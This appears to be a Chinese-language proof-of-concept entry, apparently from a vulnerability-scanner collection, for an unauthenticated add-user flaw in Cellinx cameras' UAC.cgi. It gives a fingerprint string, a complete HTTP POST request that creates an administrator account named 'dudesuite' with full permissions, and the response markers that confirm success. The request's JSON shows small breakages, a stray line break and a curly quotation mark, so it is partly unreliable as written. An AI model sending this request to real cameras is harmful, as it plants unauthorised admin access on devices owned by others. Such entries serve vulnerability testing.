﻿# cellinx 摄像机 uac.cgi 存在未授权添加用户漏洞。

> 更新时间：2024-01-17

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="local/NVT-string.js"

> 验证脚本：HTTP

```
POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
Connection: close
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip


{"jsonData": {"username":"guest","password":"","option":"add_user", "data":{"username":"dudesuite","password":"dudesuite","r
permission":{"is_admin":"1","view":"1","ptz":"1","setting":“1","dout":"1"}}}}
```

> 响应代码特征：200

> 响应内容特征：Success

> 上传文件定位：


> 验证文件来源：cellinx 摄像机 uac.cgi 存在未授权添加用户漏洞。.poc
